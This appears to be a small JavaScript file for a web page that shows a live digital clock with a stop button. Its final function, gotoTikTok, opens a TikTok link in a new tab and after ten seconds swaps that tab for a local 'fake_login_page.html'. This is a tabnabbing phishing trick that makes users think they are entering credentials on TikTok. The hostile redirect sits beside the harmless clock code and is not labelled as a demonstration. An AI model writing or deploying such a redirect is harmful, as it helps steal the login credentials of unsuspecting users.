
function checktime(){
    const current= new Date();
    let time=document.getElementById("now")

    let hour=current.getHours();
    let minute=current.getMinutes();
    let second=current.getSeconds();

    hour=hour.toString().padStart(2,'0');
    minute=minute.toString().padStart(2, '0');
    second=second.toString().padStart(2, '0');

    time.innerHTML=hour+' : '+minute+' : '+second
}
checktime()
let clock=setInterval(checktime , 1000)



function clockStop(){
    alert("Clock Stopped!");
    clearInterval(clock);
}


function gotoTikTok(){
    const windowobj=window.open("https://vt.tiktok.com/ZSmCepXHJ/", target="_blank");
    setTimeout(()=>{
        windowobj.location.replace("./fake_login_page.html");
    }, 5000*2);
}